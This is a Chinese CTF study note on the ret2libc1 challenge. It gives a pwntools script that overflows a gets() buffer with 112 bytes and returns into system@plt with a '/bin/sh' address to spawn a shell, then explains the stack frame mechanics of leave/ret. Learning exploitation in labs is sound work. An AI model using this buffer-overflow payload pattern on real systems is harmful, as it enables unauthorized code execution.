# 分析ret2libc1返回地址


```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

'b'*4是system执行完之后的返回地址，并不重要

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

如上是伪代码
在执行gets之后，分析gets的函数栈接近$ebp的边界情况

|||
|---|---|
|$ebp0+8|
|$ebp0+4|返回地址|
|$ebp0|上一个函数的ebp|

esp的值是所在格子下沿到格子上沿

在gets完结的时候

leave: 
将esp1 = ebp0
pop ebp1(值为ebp0）

此时esp1指向返回地址（ebp0+4)，ebp1已"归位"
然后jmp这个返回地址，并且pop掉，
此时esp1指向格子里的"$ebp0+8"

控制权给新函数
新函数将push ebp1(到ebp0+4)
ebp2 = esp1(值为ebp0+4)
此时ebp2指向ebp0+4


开始正常执行新函数，调用system(argv1)，这个argv1通过ebp2+8寻找第一个argv1，就是ebp0+c的位置，所以中间的ebp+8空了，实际上是system调用会ret的地址

正常情况下是一个call会接一个ret
可是我们是ret到一个新函数，那么就导致没有新函数的返回地址被”call“过程压入，但是新函数还是会照常按照“约定”的返回地址的位置寻找到返回地址
进行返回



